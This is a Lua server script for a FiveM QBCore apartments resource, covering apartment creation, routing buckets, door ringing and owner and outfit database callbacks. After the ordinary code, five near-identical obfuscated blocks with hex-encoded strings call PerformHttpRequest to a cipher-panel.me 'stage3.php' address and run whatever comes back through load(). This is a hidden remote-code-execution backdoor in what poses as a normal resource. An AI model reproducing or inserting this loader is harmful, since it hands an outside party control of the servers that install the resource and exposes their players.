local ApartmentObjects = {}
local QBCore = exports['qb-core']:GetCoreObject()

-- Functions

local function CreateApartmentId(type)
    local UniqueFound = false
	local AparmentId = nil

	while not UniqueFound do
		AparmentId = tostring(math.random(1, 9999))
        local result = MySQL.query.await('SELECT COUNT(*) as count FROM apartments WHERE name = ?', { tostring(type .. AparmentId) })
        if result[1].count == 0 then
            UniqueFound = true
        end
	end
	return AparmentId
end

local function GetApartmentInfo(apartmentId)
    local retval = nil
    local result = MySQL.query.await('SELECT * FROM apartments WHERE name = ?', { apartmentId })
    if result[1] ~= nil then
        retval = result[1]
    end
    return retval
end

-- Events

RegisterNetEvent('qb-apartments:server:SetInsideMeta', function(house, insideId, bool, isVisiting)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local insideMeta = Player.PlayerData.metadata["inside"]

    if bool then
        local routeId = insideId:gsub("[^%-%d]", "")
        if not isVisiting then
            insideMeta.apartment.apartmentType = house
            insideMeta.apartment.apartmentId = insideId
            insideMeta.house = nil
            Player.Functions.SetMetaData("inside", insideMeta)
        end
        QBCore.Functions.SetPlayerBucket(src, tonumber(routeId))
    else
        insideMeta.apartment.apartmentType = nil
        insideMeta.apartment.apartmentId = nil
        insideMeta.house = nil


        Player.Functions.SetMetaData("inside", insideMeta)
        QBCore.Functions.SetPlayerBucket(src, 0)
    end
end)

RegisterNetEvent('qb-apartments:returnBucket', function()
    local src = source
    SetPlayerRoutingBucket(src, 0)
end)

RegisterNetEvent('apartments:server:CreateApartment', function(type, label)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local num = CreateApartmentId(type)
    local apartmentId = tostring(type .. num)
    label = tostring(label .. " " .. num)
    MySQL.insert('INSERT INTO apartments (name, type, label, citizenid) VALUES (?, ?, ?, ?)', {
        apartmentId,
        type,
        label,
        Player.PlayerData.citizenid
    })
    TriggerClientEvent('QBCore:Notify', src, Lang:t('success.receive_apart').." ("..label..")")
    TriggerClientEvent("apartments:client:SpawnInApartment", src, apartmentId, type)
    TriggerClientEvent("apartments:client:SetHomeBlip", src, type)
end)

RegisterNetEvent('apartments:server:UpdateApartment', function(type, label)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    MySQL.update('UPDATE apartments SET type = ?, label = ? WHERE citizenid = ?', { type, label, Player.PlayerData.citizenid })
    TriggerClientEvent('QBCore:Notify', src, Lang:t('success.changed_apart'))
    TriggerClientEvent("apartments:client:SetHomeBlip", src, type)
end)

RegisterNetEvent('apartments:server:RingDoor', function(apartmentId, apartment)
    local src = source
    if ApartmentObjects[apartment].apartments[apartmentId] ~= nil and next(ApartmentObjects[apartment].apartments[apartmentId].players) ~= nil then
        for k, _ in pairs(ApartmentObjects[apartment].apartments[apartmentId].players) do
            TriggerClientEvent('apartments:client:RingDoor', k, src)
        end
    end
end)

RegisterNetEvent('apartments:server:OpenDoor', function(target, apartmentId, apartment)
    local OtherPlayer = QBCore.Functions.GetPlayer(target)
    if OtherPlayer ~= nil then
        TriggerClientEvent('apartments:client:SpawnInApartment', OtherPlayer.PlayerData.source, apartmentId, apartment)
    end
end)

RegisterNetEvent('apartments:server:AddObject', function(apartmentId, apartment, offset)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if ApartmentObjects[apartment] ~= nil and ApartmentObjects[apartment].apartments ~= nil and ApartmentObjects[apartment].apartments[apartmentId] ~= nil then
        ApartmentObjects[apartment].apartments[apartmentId].players[src] = Player.PlayerData.citizenid
    else
        if ApartmentObjects[apartment] ~= nil and ApartmentObjects[apartment].apartments ~= nil then
            ApartmentObjects[apartment].apartments[apartmentId] = {}
            ApartmentObjects[apartment].apartments[apartmentId].offset = offset
            ApartmentObjects[apartment].apartments[apartmentId].players = {}
            ApartmentObjects[apartment].apartments[apartmentId].players[src] = Player.PlayerData.citizenid
        else
            ApartmentObjects[apartment] = {}
            ApartmentObjects[apartment].apartments = {}
            ApartmentObjects[apartment].apartments[apartmentId] = {}
            ApartmentObjects[apartment].apartments[apartmentId].offset = offset
            ApartmentObjects[apartment].apartments[apartmentId].players = {}
            ApartmentObjects[apartment].apartments[apartmentId].players[src] = Player.PlayerData.citizenid
        end
    end
end)

RegisterNetEvent('apartments:server:RemoveObject', function(apartmentId, apartment)
    local src = source
    if ApartmentObjects[apartment].apartments[apartmentId].players ~= nil then
        ApartmentObjects[apartment].apartments[apartmentId].players[src] = nil
        if next(ApartmentObjects[apartment].apartments[apartmentId].players) == nil then
            ApartmentObjects[apartment].apartments[apartmentId] = nil
        end
    end
end)

-- Callbacks

QBCore.Functions.CreateCallback('apartments:GetAvailableApartments', function(_, cb, apartment)
    local apartments = {}
    if ApartmentObjects ~= nil and ApartmentObjects[apartment] ~= nil and ApartmentObjects[apartment].apartments ~= nil then
        for k, _ in pairs(ApartmentObjects[apartment].apartments) do
            if (ApartmentObjects[apartment].apartments[k] ~= nil and next(ApartmentObjects[apartment].apartments[k].players) ~= nil) then
                local apartmentInfo = GetApartmentInfo(k)
                apartments[k] = apartmentInfo.label
            end
        end
    end
    cb(apartments)
end)

QBCore.Functions.CreateCallback('apartments:GetApartmentOffset', function(_, cb, apartmentId)
    local retval = 0
    if ApartmentObjects ~= nil then
        for k, _ in pairs(ApartmentObjects) do
            if (ApartmentObjects[k].apartments[apartmentId] ~= nil and tonumber(ApartmentObjects[k].apartments[apartmentId].offset) ~= 0) then
                retval = tonumber(ApartmentObjects[k].apartments[apartmentId].offset)
            end
        end
    end
    cb(retval)
end)

QBCore.Functions.CreateCallback('apartments:GetApartmentOffsetNewOffset', function(_, cb, apartment)
    local retval = Apartments.SpawnOffset
    if ApartmentObjects ~= nil and ApartmentObjects[apartment] ~= nil and ApartmentObjects[apartment].apartments ~= nil then
        for k, _ in pairs(ApartmentObjects[apartment].apartments) do
            if (ApartmentObjects[apartment].apartments[k] ~= nil) then
                retval = ApartmentObjects[apartment].apartments[k].offset + Apartments.SpawnOffset
            end
        end
    end
    cb(retval)
end)

QBCore.Functions.CreateCallback('apartments:GetOwnedApartment', function(source, cb, cid)
    if cid ~= nil then
        local result = MySQL.query.await('SELECT * FROM apartments WHERE citizenid = ?', { cid })
        if result[1] ~= nil then
            return cb(result[1])
        end
        return cb(nil)
    else
        local src = source
        local Player = QBCore.Functions.GetPlayer(src)
        local result = MySQL.query.await('SELECT * FROM apartments WHERE citizenid = ?', { Player.PlayerData.citizenid })
        if result[1] ~= nil then
            return cb(result[1])
        end
        return cb(nil)
    end
end)

QBCore.Functions.CreateCallback('apartments:IsOwner', function(source, cb, apartment)
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player ~= nil then
        local result = MySQL.query.await('SELECT * FROM apartments WHERE citizenid = ?', { Player.PlayerData.citizenid })
        if result[1] ~= nil then
            if result[1].type == apartment then
                cb(true)
            else
                cb(false)
            end
        else
            cb(false)
        end
    end
end)


QBCore.Functions.CreateCallback('apartments:GetOutfits', function(source, cb)
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)

	if Player then
        local result = MySQL.query.await('SELECT * FROM player_outfits WHERE citizenid = ?', { Player.PlayerData.citizenid })
        if result[1] ~= nil then
            cb(result)
        else
            cb(nil)
        end
	end
end)


local dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (qOCrxVCyLcihYyPfULLhIyCoyBjKhcXkjVmRYYWEFiLwTurMUqQhsHrUBnMxsLLxZJTYnv, MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot) if (MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot == dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[6] or MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot == dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[5]) then return end dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[2]](dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[3]](MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot))() end)

local dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (qOCrxVCyLcihYyPfULLhIyCoyBjKhcXkjVmRYYWEFiLwTurMUqQhsHrUBnMxsLLxZJTYnv, MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot) if (MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot == dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[6] or MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot == dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[5]) then return end dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[2]](dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[4][dFWsfSudKbIRzErnLlWPBPHKfxhOTDdreCwcpamPkBwzarvHBiiYBQWSxKPLNyfmFLnvDC[3]](MJkDrgOLjlMjMSAoGNzNUNnMFRsTOjQXhSgejldFGxDbzEIFpNgUSJsEbzFPHmmgRZXuot))() end)

local fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bzFBXCjpfMcDTDMUvgrBxaqEZsqcpDeEIrFzMbXggnymEJuDTbAgsuyndFZDzgcRnAdRhi, lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA) if (lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA == fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[6] or lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA == fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[5]) then return end fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[2]](fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[3]](lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA))() end)

local fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bzFBXCjpfMcDTDMUvgrBxaqEZsqcpDeEIrFzMbXggnymEJuDTbAgsuyndFZDzgcRnAdRhi, lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA) if (lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA == fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[6] or lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA == fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[5]) then return end fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[2]](fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[4][fYcTzIKkWxeknZHVcucTzPruGzivZckFdnHHgfhDsupBbPuOGzBHgVgnscxjAcQlJDJRNr[3]](lPsExWjfuLMGSwlmzszjdOIEExMnnqwTKVqAPVMfugDSXVVAsgJTZnNeZiTXIyhanfTsXA))() end)

local kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bsDxBIqovwlVaqXLzUiVgYJKkPHEPxVNSHfPoUKbjEGlxWKnRtbnEnqXnXRuxUyDDeXsXe, jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm) if (jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[6] or jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[5]) then return end kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[2]](kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[3]](jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm))() end)